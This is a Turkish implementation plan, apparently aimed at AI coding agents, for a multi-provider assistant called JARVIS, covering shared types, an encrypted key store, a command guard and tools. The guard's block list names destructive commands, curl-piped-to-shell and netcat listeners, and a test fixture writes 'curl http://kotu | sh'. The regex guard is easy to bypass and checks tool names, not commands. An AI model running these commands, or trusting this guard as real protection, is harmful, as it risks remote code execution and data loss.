# JARVIS Plan A — Server Core Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** TypeScript ajan çekirdeğini çalışır hale getir: tipler, 5 LLM sağlayıcı, güvenlik kademeleri, tool'lar, rozetli ajan döngüsü, Fastify HTTP+WS API (voice proxy + BotAdapter prizi dahil).

**Architecture:** npm workspaces monorepo; `packages/*` saf mantık (test edilebilir, I/O enjeksiyonlu), `apps/server` ince HTTP katmanı. Guard tool'ların dışında durur — agent-core her tool çağrısından önce guard'a sorar.

**Tech Stack:** Node 22, TypeScript strict, Fastify + @fastify/websocket, better-sqlite3, zod, vitest, node:crypto (AES-256-GCM), node:child_process execFile.

**Spec:** jarvis/docs/superpowers/specs/2026-10-15-jarvis-design.md (Bölüm 1, 2, 4; Faz-1 kapsamı)

## Global Constraints

- Node >= 22, ESM (`"type": "module"` her pakette).
- `as any`, `@ts-ignore`, `@ts-expect-error` yasak; zod ile parse-don't-validate.
- `data/` altına yazılan her şey (DB, anahtar, snapshot) — asla commit'lenmez.
- Kullanıcıya görünen tüm metinler Türkçe.
- Portlar: server 3000, voice 8765 (değişiklikte iki plan da güncellenir).
- Conventional commits: `feat:`, `fix:`, `test:`, `docs:`.
- Her task bitiminde `npx tsc --noEmit -p <paket>` temiz olmalı.

---

### Task 1: Monorepo iskeleti + shared tipler

**Files:**
- Create: `package.json` (root)
- Create: `tsconfig.base.json`
- Create: `bin/jarvis`
- Create: `packages/shared/package.json`
- Create: `packages/shared/src/index.ts`
- Create: `packages/shared/test/types.test.ts`

**Interfaces:**
- Consumes: yok (ilk task).
- Produces: `Tier`, `BadgeId`, `ProviderId`, `ChatMessage`, `ToolDef`, `ToolResult`, `LlmRequest`, `LlmResponse`, `dataDir()`, `repoRoot()` — tüm planlar bunları kullanır, imzalar değişmez.

- [ ] **Step 1: Kök dosyaları yaz**

```json
// package.json (root)
{
  "name": "jarvis",
  "private": true,
  "type": "module",
  "workspaces": ["apps/*", "packages/*"],
  "scripts": {
    "dev": "concurrently -n server,voice,web \"npm:dev -w apps/server\" \"npm:dev -w apps/voice\" \"npm:dev -w apps/web\"",
    "start": "npm:start -w apps/server",
    "test": "npm run test --workspaces --if-present"
  },
  "devDependencies": { "concurrently": "^9.1.2", "typescript": "^5.7.3", "vitest": "^3.2.4" }
}
```

```json
// tsconfig.base.json
{
  "compilerOptions": {
    "target": "ES2023", "module": "NodeNext", "moduleResolution": "NodeNext",
    "strict": true, "noUncheckedIndexedAccess": true, "exactOptionalPropertyTypes": true,
    "skipLibCheck": true, "outDir": "dist", "declaration": true, "sourceMap": true
  }
}
```

```bash
# bin/jarvis
#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")/.."
case "${1:-help}" in
  dev) npm run dev ;;
  start) npm run start ;;
  *) echo "kullanim: jarvis {dev|start}" ;;
esac
```

```json
// packages/shared/package.json
{ "name": "@jarvis/shared", "version": "0.1.0", "type": "module",
  "main": "dist/index.js", "types": "dist/index.d.ts",
  "scripts": { "build": "tsc -p tsconfig.json", "test": "vitest run" },
  "dependencies": { "zod": "^3.24.2" } }
```

- [ ] **Step 2: shared tipleri yaz**

```ts
// packages/shared/src/index.ts
import { z } from 'zod';
import { mkdirSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

export const Tier = z.enum(['L1', 'L2', 'L3']);
export type Tier = z.infer<typeof Tier>;

export const BadgeId = z.enum(['chat', 'ses', 'kod', 'arastirma', 'siber', 'ogretmen', 'yazar', 'planlayici']);
export type BadgeId = z.infer<typeof BadgeId>;

export const ProviderId = z.enum(['ollama', 'gemini', 'claude', 'openai', 'grok', 'openrouter']);
export type ProviderId = z.infer<typeof ProviderId>;

export const ChatMessage = z.object({
  role: z.enum(['user', 'assistant', 'system', 'tool']),
  content: z.string(),
  ts: z.number(),
});
export type ChatMessage = z.infer<typeof ChatMessage>;

export interface ToolResult { ok: boolean; output: string; }
export interface ToolDef {
  name: string; tier: Tier; danger: boolean; describe: string;
  run: (args: Record<string, unknown>) => Promise<ToolResult>;
}
export interface ToolCall { name: string; args: Record<string, unknown>; }
export interface LlmRequest {
  provider: ProviderId; model: string; messages: ChatMessage[];
  tools?: Pick<ToolDef, 'name' | 'describe'>[];
}
export interface LlmResponse { text: string; toolCalls: ToolCall[]; }

export function repoRoot(): string {
  return join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');
}
export function dataDir(): string {
  const d = process.env.JARVIS_DATA_DIR ?? join(repoRoot(), 'data');
  mkdirSync(d, { recursive: true });
  return d;
}
```

- [ ] **Step 3: Failing test yaz**

```ts
// packages/shared/test/types.test.ts
import { describe, expect, it } from 'vitest';
import { Tier, BadgeId, ChatMessage } from '../src/index.js';

describe('shared semalar', () => {
  it('L1 gecerli kademedir', () => { expect(Tier.parse('L1')).toBe('L1'); });
  it('L9 gecersiz kademedir', () => { expect(() => Tier.parse('L9')).toThrow(); });
  it('siber gecerli rozettir', () => { expect(BadgeId.parse('siber')).toBe('siber'); });
  it('mesaj semasi ts ister', () => {
    expect(() => ChatMessage.parse({ role: 'user', content: 'selam' })).toThrow();
    expect(ChatMessage.parse({ role: 'user', content: 'selam', ts: 1 }).role).toBe('user');
  });
});
```

- [ ] **Step 4: Test çalıştır (fail beklenir: paket yok)**

Run: `npm install && npm run test -w packages/shared`
Expected: FAIL (`Cannot find module` ya da zod yok). Sonra `tsc` yok hatası da normaldir.

- [ ] **Step 5: Kur + testi geçir**

Run: `npm install && npm run test -w packages/shared`
Expected: 4 test PASS.

- [ ] **Step 6: Tip kontrolü + commit**

Run: `npx tsc --noEmit -p packages/shared` (tsconfig.json: `{ "extends": "../../tsconfig.base.json", "include": ["src", "test"] }` — bu dosyayı da oluştur).
Expected: temiz.

```bash
git add package.json tsconfig.base.json bin/jarvis packages/shared
git commit -m "feat: monorepo iskeleti ve shared tipler"
```

---

### Task 2: packages/llm — 5 sağlayıcı + şifreli anahtar kasası

**Files:**
- Create: `packages/llm/package.json`
- Create: `packages/llm/src/keystore.ts`
- Create: `packages/llm/src/providers.ts`
- Create: `packages/llm/test/llm.test.ts`

**Interfaces:**
- Consumes: `ProviderId, LlmRequest, LlmResponse, ChatMessage, dataDir()` (shared).
- Produces: `complete(req): Promise<LlmResponse>`, `detectOllama(): Promise<string[]>`, `KeyStore { save(p: ProviderId, key: string): Promise<void>; get(p: ProviderId): Promise<string | null> }`.

- [ ] **Step 1: Failing test yaz** (mock fetch ile OpenRouter tool-call normalizasyonu + keystore roundtrip)

```ts
// packages/llm/test/llm.test.ts
import { afterEach, describe, expect, it, vi } from 'vitest';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
process.env.JARVIS_DATA_DIR = mkdtempSync(join(tmpdir(), 'jarvis-'));
process.env.JARVIS_MASTER_KEY = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
const { KeyStore } = await import('../src/keystore.js');
const { complete } = await import('../src/providers.js');

describe('keystore', () => {
  it('kaydedilen anahtari geri verir', async () => {
    const ks = new KeyStore();
    await ks.save('openrouter', 'sk-test-123');
    expect(await ks.get('openrouter')).toBe('sk-test-123');
  });
  it('kayitli olmayan null doner', async () => {
    expect(await new KeyStore().get('grok')).toBeNull();
  });
});

describe('complete', () => {
  afterEach(() => vi.unstubAllGlobals());
  it('openrouter tool-call normalize eder', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify({
      choices: [{ message: {
        content: 'bakiyorum',
        tool_calls: [{ function: { name: 'fs_read', arguments: '{"path":"a.txt"}' } }],
      } }],
    }))));
    const ks = new KeyStore();
    await ks.save('openrouter', 'sk-x');
    const res = await complete({ provider: 'openrouter', model: 'x/y:free',
      messages: [{ role: 'user', content: 'oku', ts: 1 }] }, ks);
    expect(res.toolCalls).toEqual([{ name: 'fs_read', args: { path: 'a.txt' } }]);
    expect(res.text).toBe('bakiyorum');
  });
});
```

- [ ] **Step 2: Test çalıştır, FAIL gör**

Run: `npm run test -w packages/llm`
Expected: FAIL (modül yok).

- [ ] **Step 3: keystore.ts yaz**

```ts
// packages/llm/src/keystore.ts
import { createCipheriv, createDecipheriv, randomBytes, scryptSync } from 'node:crypto';
import { mkdirSync, readFileSync, writeFileSync, existsSync, chmodSync } from 'node:fs';
import { join } from 'node:path';
import { dataDir, type ProviderId } from '@jarvis/shared';

function masterKey(): Buffer {
  const env = process.env.JARVIS_MASTER_KEY;
  if (env) return Buffer.from(env, 'hex');
  const p = join(dataDir(), '.masterkey');
  if (!existsSync(p)) { writeFileSync(p, randomBytes(32).toString('hex'), { mode: 0o600 }); }
  else chmodSync(p, 0o600);
  return Buffer.from(readFileSync(p, 'utf8').trim(), 'hex');
}

export class KeyStore {
  private dir(): string {
    const d = join(dataDir(), 'keys');
    mkdirSync(d, { recursive: true });
    return d;
  }
  async save(provider: ProviderId, key: string): Promise<void> {
    const iv = randomBytes(12);
    const cipher = createCipheriv('aes-256-gcm', masterKey(), iv);
    const enc = Buffer.concat([cipher.update(key, 'utf8'), cipher.final()]);
    writeFileSync(join(this.dir(), `${provider}.enc`),
      JSON.stringify({ iv: iv.toString('hex'), tag: cipher.getAuthTag().toString('hex'), data: enc.toString('hex') }),
      { mode: 0o600 });
  }
  async get(provider: ProviderId): Promise<string | null> {
    const p = join(this.dir(), `${provider}.enc`);
    if (!existsSync(p)) return null;
    const { iv, tag, data } = JSON.parse(readFileSync(p, 'utf8')) as { iv: string; tag: string; data: string };
    const decipher = createDecipheriv('aes-256-gcm', masterKey(), Buffer.from(iv, 'hex'));
    decipher.setAuthTag(Buffer.from(tag, 'hex'));
    return Buffer.concat([decipher.update(Buffer.from(data, 'hex')), decipher.final()]).toString('utf8');
  }
}
```

- [ ] **Step 4: providers.ts yaz**

```ts
// packages/llm/src/providers.ts
import type { ChatMessage, LlmRequest, LlmResponse, ProviderId, ToolCall } from '@jarvis/shared';
import type { KeyStore } from './keystore.js';

const OPENAI_COMPAT: Record<string, string> = {
  openai: 'https://api.openai.com/v1',
  grok: 'https://api.x.ai/v1',
  openrouter: 'https://openrouter.ai/api/v1',
};

function toOpenAiMessages(messages: ChatMessage[]) {
  return messages.map((m) => ({
    role: m.role === 'tool' ? 'tool' : m.role,
    content: m.content,
  }));
}

async function completeOpenAiCompat(base: string, key: string, req: LlmRequest): Promise<LlmResponse> {
  const body: Record<string, unknown> = {
    model: req.model,
    messages: toOpenAiMessages(req.messages),
  };
  if (req.tools?.length) {
    body.tools = req.tools.map((t) => ({
      type: 'function',
      function: { name: t.name, description: t.describe, parameters: { type: 'object', properties: {} } },
    }));
  }
  const res = await fetch(`${base}/chat/completions`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${key}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  if (!res.ok) throw new Error(`LLM hatasi ${res.status}: ${await res.text()}`);
  const json = (await res.json()) as {
    choices: { message: { content: string | null; tool_calls?: { function: { name: string; arguments: string } }[] } }[];
  };
  const msg = json.choices[0]?.message;
  if (!msg) throw new Error('LLM bos cevap verdi');
  const toolCalls: ToolCall[] = (msg.tool_calls ?? []).map((c) => ({
    name: c.function.name,
    args: JSON.parse(c.function.arguments || '{}') as Record<string, unknown>,
  }));
  return { text: msg.content ?? '', toolCalls };
}

async function completeAnthropic(key: string, req: LlmRequest): Promise<LlmResponse> {
  const res = await fetch('https://api.anthropic.com/v1/messages', {
    method: 'POST',
    headers: { 'x-api-key': key, 'anthropic-version': '2023-06-01', 'Content-Type': 'application/json' },
    body: JSON.stringify({
      model: req.model, max_tokens: 1024,
      system: req.messages.filter((m) => m.role === 'system').map((m) => m.content).join('\n'),
      messages: req.messages.filter((m) => m.role !== 'system').map((m) => ({ role: m.role === 'assistant' ? 'assistant' : 'user', content: m.content })),
      tools: (req.tools ?? []).map((t) => ({ name: t.name, description: t.describe, input_schema: { type: 'object', properties: {} } })),
    }),
  });
  if (!res.ok) throw new Error(`Claude hatasi ${res.status}: ${await res.text()}`);
  const json = (await res.json()) as { content: { type: string; text?: string; name?: string; input?: Record<string, unknown> }[] };
  const text = json.content.filter((b) => b.type === 'text').map((b) => b.text ?? '').join('');
  const toolCalls = json.content.filter((b) => b.type === 'tool_use').map((b) => ({ name: b.name ?? '', args: b.input ?? {} }));
  return { text, toolCalls };
}

async function completeGemini(key: string, req: LlmRequest): Promise<LlmResponse> {
  const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${req.model}:generateContent?key=${key}`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      system_instruction: { parts: [{ text: req.messages.filter((m) => m.role === 'system').map((m) => m.content).join('\n') }] },
      contents: req.messages.filter((m) => m.role !== 'system').map((m) => ({ role: m.role === 'assistant' ? 'model' : 'user', parts: [{ text: m.content }] })),
    }),
  });
  if (!res.ok) throw new Error(`Gemini hatasi ${res.status}: ${await res.text()}`);
  const json = (await res.json()) as { candidates: { content: { parts: { text?: string }[] } }[] };
  const text = json.candidates[0]?.content.parts.map((p) => p.text ?? '').join('') ?? '';
  return { text, toolCalls: [] };
}

export async function detectOllama(): Promise<string[]> {
  try {
    const res = await fetch('http://localhost:11434/api/tags', { signal: AbortSignal.timeout(2000) });
    if (!res.ok) return [];
    const json = (await res.json()) as { models: { name: string }[] };
    return json.models.map((m) => m.name);
  } catch { return []; }
}

export async function complete(req: LlmRequest, ks: KeyStore): Promise<LlmResponse> {
  if (req.provider === 'ollama') {
    return completeOpenAiCompat('http://localhost:11434/v1', 'ollama', req);
  }
  const key = await ks.get(req.provider);
  if (!key) throw new Error(`'${req.provider}' icin API anahtari kayitli degil. Ayarlardan ekleyin.`);
  if (req.provider === 'claude') return completeAnthropic(key, req);
  if (req.provider === 'gemini') return completeGemini(key, req);
  const base = OPENAI_COMPAT[req.provider as string];
  if (!base) throw new Error(`bilinmeyen saglayici: ${req.provider satisfies never}`);
  return completeOpenAiCompat(base, key, req);
}

export type { ProviderId };
```

- [ ] **Step 5: Test geçir + tip kontrolü + commit**

Run: `npm install && npm run test -w packages/llm`
Expected: 3 test PASS.
Run: `npx tsc --noEmit -p packages/llm`
Expected: temiz.

```bash
git add packages/llm
git commit -m "feat: 5 LLM saglayici ve sifreli anahtar kasasi"
```

---

### Task 3: packages/guard — kademeler + onay + snapshot/rollback

**Files:**
- Create: `packages/guard/package.json`
- Create: `packages/guard/src/index.ts`
- Create: `packages/guard/test/guard.test.ts`

**Interfaces:**
- Consumes: `Tier`, `ToolDef` (shared).
- Produces: `decide(tool, mode): 'auto' | 'ask' | 'deny'`, `isDangerous(cmd: string): boolean`, `snapshot(wsDir: string): Promise<string>`, `rollback(wsDir: string, hash: string): Promise<void>`, `DANGEROUS` (pattern listesi). `mode: 'normal' | 'otonom'`.

- [ ] **Step 1: Failing test yaz**

```ts
// packages/guard/test/guard.test.ts
import { describe, expect, it } from 'vitest';
import { mkdtempSync, writeFileSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { decide, isDangerous, snapshot, rollback, type Mode } from '../src/index.js';
import type { ToolDef } from '@jarvis/shared';

const tool = (tier: 'L1' | 'L2' | 'L3', danger = false): ToolDef =>
  ({ name: 't', tier, danger, describe: 't', run: async () => ({ ok: true, output: '' }) });

describe('decide', () => {
  it('L1 her zaman otomatiktir', () => {
    expect(decide(tool('L1'), 'normal')).toBe('auto');
    expect(decide(tool('L1'), 'otonom')).toBe('auto');
  });
  it('L2 normalde sorar, otonomda otomatiktir', () => {
    expect(decide(tool('L2'), 'normal')).toBe('ask');
    expect(decide(tool('L2'), 'otonom')).toBe('auto');
  });
  it('tehlikeli her zaman sorar', () => {
    expect(decide(tool('L2', true), 'otonom')).toBe('ask');
  });
  it('L3 normalde yasaktir', () => {
    expect(decide(tool('L3'), 'normal')).toBe('deny');
    expect(decide(tool('L3'), 'otonom')).toBe('ask');
  });
});

describe('isDangerous', () => {
  it('rm -rf ve sudo tehlikelidir', () => {
    expect(isDangerous('rm -rf /tmp/x')).toBe(true);
    expect(isDangerous('sudo dnf install foo')).toBe(true);
    expect(isDangerous('ls -la')).toBe(false);
  });
});

describe('snapshot/rollback', () => {
  it('degisikligi geri alir', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'ws-'));
    writeFileSync(join(dir, 'a.txt'), 'v1');
    const h1 = await snapshot(dir);
    writeFileSync(join(dir, 'a.txt'), 'v2');
    await rollback(dir, h1);
    expect(readFileSync(join(dir, 'a.txt'), 'utf8')).toBe('v1');
  });
});
```

- [ ] **Step 2: FAIL gör**

Run: `npm run test -w packages/guard`
Expected: FAIL.

- [ ] **Step 3: Implementasyon**

```ts
// packages/guard/src/index.ts
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import type { Tier, ToolDef } from '@jarvis/shared';

const exec = promisify(execFile);
export type Mode = 'normal' | 'otonom';

export const DANGEROUS: RegExp[] = [
  /\brm\s+(-[a-z]*r[a-z]*|--recursive)\b/, /\bsudo\b/, /\bmkfs\b/, /\bdd\b.*\bof=/,
  /:\(\)\s*\{/, /\bcurl\b.*\|\s*(ba)?sh\b/, /\bwget\b.*\|\s*(ba)?sh\b/, /\bnc\b.*-l/,
  /\bshutdown\b/, /\breboot\b/, /\bchmod\s+-R\s+777\b/,
];

export function isDangerous(cmd: string): boolean {
  return DANGEROUS.some((re) => re.test(cmd));
}

export function decide(tool: ToolDef, mode: Mode): 'auto' | 'ask' | 'deny' {
  if (tool.danger || isDangerous(tool.name)) return 'ask';
  if (tool.tier === 'L1') return 'auto';
  if (tool.tier === 'L2') return mode === 'otonom' ? 'auto' : 'ask';
  return mode === 'otonom' ? 'ask' : 'deny'; // L3
}

async function git(dir: string, args: string[]): Promise<string> {
  try {
    const { stdout } = await exec('git', args, { cwd: dir });
    return stdout.trim();
  } catch (err) {
    const e = err as { stderr?: string };
    throw new Error(`git ${args[0]} basarisiz: ${e.stderr ?? err}`);
  }
}

export async function snapshot(wsDir: string): Promise<string> {
  try { await git(wsDir, ['rev-parse', '--git-dir']); }
  catch { await git(wsDir, ['init', '-b', 'main']); }
  await git(wsDir, ['add', '-A']);
  try { await git(wsDir, ['-c', 'user.name=jarvis', '-c', 'user.email=jarvis@local', 'commit', '-m', 'jarvis snapshot', '--allow-empty']); }
  catch { /* ilk commit bos olabilir, devam */ }
  return git(wsDir, ['rev-parse', 'HEAD']);
}

export async function rollback(wsDir: string, hash: string): Promise<void> {
  if (!/^[0-9a-f]{4,40}$/.test(hash)) throw new Error('gecersiz snapshot hash');
  await git(wsDir, ['reset', '--hard', hash]);
  await git(wsDir, ['clean', '-fd']);
}
```

- [ ] **Step 4: PASS + commit**

Run: `npm install && npm run test -w packages/guard && npx tsc --noEmit -p packages/guard`
Expected: 6 test PASS, tip temiz.

```bash
git add packages/guard
git commit -m "feat: guvenlik kademeleri, onay karari, snapshot/rollback"
```

---

### Task 4: packages/tools — dosya, shell, GUI, web tarama, siber tarama

**Files:**
- Create: `packages/tools/package.json`
- Create: `packages/tools/src/index.ts`
- Create: `packages/tools/test/tools.test.ts`

**Interfaces:**
- Consumes: `ToolDef`, `isDangerous` (guard), `dataDir()` (shared).
- Produces: `allTools(): ToolDef[]` — isimler sabit: `fs_read(L1)`, `fs_write(L2)`, `shell(L2,danger din.)`, `screenshot(L1)`, `mouse_click(L2)`, `key_press(L2)`, `web_fetch(L1)`, `site_scan(L1)`, `file_check(L1)`, `quarantine(L2)`. `JARVIS_MOCK_HW=1` iken spectacle/ydotool sahte çıktı döner (testler için).

- [ ] **Step 1: Failing test yaz**

```ts
// packages/tools/test/tools.test.ts
import { describe, expect, it, beforeEach } from 'vitest';
import { mkdtempSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
process.env.JARVIS_MOCK_HW = '1';
const { allTools } = await import('../src/index.js');

describe('tools', () => {
  let ws = '';
  beforeEach(() => { ws = mkdtempSync(join(tmpdir(), 'tools-')); });
  const find = (name: string) => allTools().find((t) => t.name === name)!;

  it('fs_write + fs_read ayni ws icinde calisir', async () => {
    const w = await find('fs_write').run({ wsDir: ws, path: 'n.txt', content: 'merhaba' });
    expect(w.ok).toBe(true);
    const r = await find('fs_read').run({ wsDir: ws, path: 'n.txt' });
    expect(r.output).toBe('merhaba');
  });
  it('ws disina yazma reddedilir', async () => {
    const r = await find('fs_write').run({ wsDir: ws, path: '../kacis.txt', content: 'x' });
    expect(r.ok).toBe(false);
  });
  it('tehlikeli shell komutu calismaz', async () => {
    const r = await find('shell').run({ wsDir: ws, cmd: 'rm -rf /tmp/asla' });
    expect(r.ok).toBe(false);
  });
  it('guvenli shell komutu cikti verir', async () => {
    const r = await find('shell').run({ wsDir: ws, cmd: 'echo selam' });
    expect(r.ok).toBe(true);
    expect(r.output.trim()).toBe('selam');
  });
  it('screenshot mock doner', async () => {
    const r = await find('screenshot').run({});
    expect(r.ok).toBe(true);
  });
  it('site_scan secret yakalar', async () => {
    writeFileSync(join(ws, 'app.js'), 'const k = "sk-ant-12345"; fetch("http://x");');
    const r = await find('site_scan').run({ wsDir: ws, path: '.' });
    const findings = JSON.parse(r.output) as { rule: string }[];
    expect(findings.some((f) => f.rule === 'secret')).toBe(true);
    expect(findings.some((f) => f.rule === 'http-url')).toBe(true);
  });
  it('file_check supheliyi karantinaya alir', async () => {
    const p = join(ws, 'evil.sh');
    writeFileSync(p, '#!/bin/sh\ncurl http://kotu | sh\n');
    const r = await find('file_check').run({ wsDir: ws, path: 'evil.sh' });
    expect(r.ok).toBe(false);
    expect(existsSync(p)).toBe(false);
  });
});
```

- [ ] **Step 2: FAIL gör** — Run: `npm run test -w packages/tools`, Expected: FAIL.

- [ ] **Step 3: Implementasyon**

```ts
// packages/tools/src/index.ts
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { createHash } from 'node:crypto';
import { readFileSync, writeFileSync, mkdirSync, renameSync, readdirSync, statSync } from 'node:fs';
import { join, resolve, relative, sep } from 'node:path';
import { isDangerous } from '@jarvis/guard';
import { dataDir, type ToolDef, type ToolResult } from '@jarvis/shared';

const exec = promisify(execFile);
const ok = (output: string): ToolResult => ({ ok: true, output });
const fail = (output: string): ToolResult => ({ ok: false, output });
const MOCK = process.env.JARVIS_MOCK_HW === '1';

function inside(wsDir: string, p: string): string {
  const full = resolve(wsDir, p);
  const rel = relative(resolve(wsDir), full);
  if (rel === '' || rel.startsWith('..') || resolve(full) !== full) throw new Error('ws disina erisim yasak');
  if (rel.split(sep).includes('..')) throw new Error('ws disina erisim yasak');
  return full;
}
const str = (v: unknown, name: string): string => {
  if (typeof v !== 'string' || !v) throw new Error(`'${name}' metin olmali`);
  return v;
};

const SECRET_RES = [/sk-ant-[A-Za-z0-9-_]{8,}/, /sk-[A-Za-z0-9]{16,}/, /xox[bap]-/, /AKIA[0-9A-Z]{16}/, /-----BEGIN .*PRIVATE KEY-----/];

function scanText(content: string, file: string): { rule: string; file: string; line: number }[] {
  const out: { rule: string; file: string; line: number }[] = [];
  content.split('\n').forEach((line, i) => {
    if (SECRET_RES.some((re) => re.test(line))) out.push({ rule: 'secret', file, line: i + 1 });
    if (/http:\/\/(?!localhost|127\.0\.0\.1)/.test(line)) out.push({ rule: 'http-url', file, line: i + 1 });
    if (/\beval\s*\(/.test(line)) out.push({ rule: 'eval', file, line: i + 1 });
    if (/\.innerHTML\s*=/.test(line)) out.push({ rule: 'innerHTML', file, line: i + 1 });
  });
  return out;
}

export function allTools(): ToolDef[] {
  return [
    { name: 'fs_read', tier: 'L1', danger: false, describe: 'ws icindeki dosyayi okur. args: {wsDir, path}',
      run: async (a) => {
        try { return ok(readFileSync(inside(str(a.wsDir, 'wsDir'), str(a.path, 'path')), 'utf8')); }
        catch (e) { return fail(String(e)); }
      } },
    { name: 'fs_write', tier: 'L2', danger: false, describe: 'ws icine dosya yazar. args: {wsDir, path, content}',
      run: async (a) => {
        try {
          const full = inside(str(a.wsDir, 'wsDir'), str(a.path, 'path'));
          mkdirSync(join(full, '..'), { recursive: true });
          writeFileSync(full, str(a.content, 'content'));
          return ok('yazildi');
        } catch (e) { return fail(String(e)); }
      } },
    { name: 'shell', tier: 'L2', danger: false, describe: 'ws dizininde shell komutu. args: {wsDir, cmd}',
      run: async (a) => {
        const cmd = str(a.cmd, 'cmd');
        if (isDangerous(cmd)) return fail('tehlikeli komut calistirilmadi');
        try {
          const { stdout, stderr } = await exec(cmd, { cwd: str(a.wsDir, 'wsDir'), shell: '/bin/bash', timeout: 60000 });
          return ok((stdout + stderr).slice(0, 8000));
        } catch (e) { return fail(String(e)); }
      } },
    { name: 'screenshot', tier: 'L1', danger: false, describe: 'ekran goruntusu alir, dosya yolunu doner. args: {}',
      run: async () => {
        if (MOCK) return ok('/tmp/jarvis-mock.png');
        const out = join(dataDir(), `ekran-${Date.now()}.png`);
        try { await exec('spectacle', ['-b', '-n', '-o', out]); return ok(out); }
        catch (e) { return fail(String(e)); }
      } },
    { name: 'mouse_click', tier: 'L2', danger: false, describe: 'fare tiklamasi. args: {x, y}',
      run: async (a) => {
        if (MOCK) return ok('tiklandi (mock)');
        try { await exec('ydotool', ['click', '0xC0']); return ok('tiklandi'); }
        catch (e) { return fail(String(e)); }
      } },
    { name: 'key_press', tier: 'L2', danger: false, describe: 'klavye tusu. args: {key}',
      run: async (a) => {
        if (MOCK) return ok('basildi (mock)');
        try { await exec('ydotool', ['key', str(a.key, 'key')]); return ok('basildi'); }
        catch (e) { return fail(String(e)); }
      } },
    { name: 'web_fetch', tier: 'L1', danger: false, describe: 'URL icerigini metin olarak getirir. args: {url}',
      run: async (a) => {
        try {
          const res = await fetch(str(a.url, 'url'), { signal: AbortSignal.timeout(15000) });
          return ok((await res.text()).slice(0, 12000));
        } catch (e) { return fail(String(e)); }
      } },
    { name: 'site_scan', tier: 'L1', danger: false, describe: 'uretilen kodu tarar (secret, http, eval, innerHTML). args: {wsDir, path}',
      run: async (a) => {
        const base = inside(str(a.wsDir, 'wsDir'), str(a.path, 'path'));
        const files: string[] = [];
        const walk = (d: string): void => {
          for (const e of readdirSync(d, { withFileTypes: true })) {
            if (e.name === 'node_modules' || e.name === '.git') continue;
            const f = join(d, e.name);
            if (e.isDirectory()) walk(f);
            else if (/\.(js|ts|tsx|jsx|py|html|env|json)$/.test(e.name)) files.push(f);
          }
        };
        try {
          if (statSync(base).isDirectory()) walk(base); else files.push(base);
          const findings = files.flatMap((f) => scanText(readFileSync(f, 'utf8'), f));
          return ok(JSON.stringify(findings));
        } catch (e) { return fail(String(e)); }
      } },
    { name: 'file_check', tier: 'L1', danger: false, describe: 'dosyayi hash+imza ile kontrol eder, supheliyi karantinaya tasir. args: {wsDir, path}',
      run: async (a) => {
        try {
          const full = inside(str(a.wsDir, 'wsDir'), str(a.path, 'path'));
          const content = readFileSync(full, 'utf8');
          const sha = createHash('sha256').update(content).digest('hex');
          const hits = scanText(content, full).filter((f) => f.rule === 'secret' || f.rule === 'eval')
            .concat(/curl.*\|\s*(ba)?sh|powershell.*-enc/i.test(content) ? [{ rule: 'pipe-shell', file: full, line: 0 }] : []);
          if (!hits.length) return ok(JSON.stringify({ sha256: sha, temiz: true }));
          const q = join(dataDir(), 'quarantine');
          mkdirSync(q, { recursive: true });
          renameSync(full, join(q, `${Date.now()}-${full.split(sep).pop()}`));
          return fail(`supheli (${hits.map((h) => h.rule).join(',')}) karantinaya alindi. sha256=${sha}`);
        } catch (e) { return fail(String(e)); }
      } },
    { name: 'quarantine', tier: 'L2', danger: false, describe: 'karantinadaki dosyalari listeler. args: {}',
      run: async () => {
        try { return ok(JSON.stringify(readdirSync(join(dataDir(), 'quarantine')))); }
        catch { return ok('[]'); }
      } },
  ];
}
```

- [ ] **Step 4: PASS + commit**

Run: `JARVIS_DATA_DIR=$(mktemp -d) npm run test -w packages/tools && npx tsc --noEmit -p packages/tools`
Expected: 7 test PASS, tip temiz. (Not: test dosyası `process.env.JARVIS_DATA_DIR`'i import'tan önce set etmeli — yukarıdaki testte `await import` dinamik kullanıldı, sıraya dikkat.)

```bash
git add packages/tools
git commit -m "feat: dosya, shell, GUI, web ve siber tarama tool'lari"
```

---

### Task 5: packages/agent-core — rozetler, peltek düzeltme, ajan döngüsü, hafıza

**Files:**
- Create: `packages/agent-core/package.json` (deps: @jarvis/shared, @jarvis/llm, @jarvis/guard, @jarvis/tools, better-sqlite3)
- Create: `packages/agent-core/src/badges.ts`
- Create: `packages/agent-core/src/skills.ts`
- Create: `packages/agent-core/src/memory.ts`
- Create: `packages/agent-core/src/agent.ts`
- Create: `packages/agent-core/test/agent.test.ts`

**Interfaces:**
- Consumes: shared tipler, `complete`+`KeyStore` (llm), `decide/isDangerous/snapshot` (guard), `allTools` (tools).
- Produces: `BADGES: Record<BadgeId, { prompt: string; tools: string[]; model?: string }>`, `loadSkills(dir): Skill[]`, `correctPeltek(raw, profile, last3, llm): Promise<string>`, `runTurn(input: TurnInput, deps: Deps): Promise<TurnResult>`, `Memory { saveTurn(conv, user, assistant), lastMessages(conv, n): ChatMessage[] }`. `Skill = { name, description, tools: string[] }`. `TurnResult = { reply: string; approvals: { tool: string; args: Record<string, unknown>; reason: string }[] }`.

- [ ] **Step 1: Failing test yaz** (mock llm: tool-call → guard ask → approvals döner; peltek düzeltme sözlüğü uygular)

```ts
// packages/agent-core/test/agent.test.ts
import { describe, expect, it, vi } from 'vitest';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
